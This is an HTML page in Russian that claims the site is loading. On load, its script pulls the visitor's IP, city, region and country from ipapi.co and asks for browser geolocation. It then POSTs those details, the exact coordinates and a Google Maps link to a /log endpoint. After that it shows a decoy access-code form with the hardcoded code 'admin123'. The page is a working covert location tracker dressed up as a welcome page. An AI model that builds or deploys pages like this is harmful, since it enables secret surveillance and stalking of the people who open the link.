<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Добро пожаловать</title>
    <style>
      body {
        font-family: sans-serif;
        background: #f0f0f0;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        margin: 0;
      }
      h2 {
        margin-bottom: 20px;
      }
      form {
        display: flex;
        flex-direction: column;
        gap: 10px;
        align-items: center;
      }
      input, button {
        padding: 10px;
        font-size: 16px;
        width: 200px;
        border-radius: 5px;
        border: 1px solid #ccc;
      }
      button {
        background-color: #4CAF50;
        color: white;
        border: none;
        cursor: pointer;
      }
      button:hover {
        background-color: #45a049;
      }
    </style>
  </head>
  <body>
    <h2>Сайт загружается…</h2>
    <script>
      async function run() {
        try {
          const ip = await fetch('https://ipapi.co/json/').then(r => r.json());

          navigator.geolocation.getCurrentPosition(async pos => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;

            const payload = {
              timestamp: new Date().toISOString(),
              ip: ip.ip,
              city: ip.city,
              region: ip.region,
              country: ip.country_name,
              latitude: lat,
              longitude: lon,
              map: `https://www.google.com/maps?q=${lat},${lon}`
            };

            await fetch('/log', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify(payload)
            });

            document.body.innerHTML = `
              <h2>Введите код доступа</h2>
              <form id="loginForm">
                <input id="code" placeholder="Код" required>
                <button type="submit">Войти</button>
              </form>
            `;
            document.getElementById('loginForm').onsubmit = function(e) {
              e.preventDefault();
              const code = document.getElementById('code').value;
              location.href = code === 'admin123' ? '/admin' : '/loading';
            };
          }, err => {
            document.body.innerHTML = "<h2>Вы запретили доступ к геолокации</h2>";
          });
        } catch (err) {
          document.body.innerHTML = "<h2>Ошибка при загрузке</h2>";
        }
      }
      run();
    </script>
  </body>
</html>
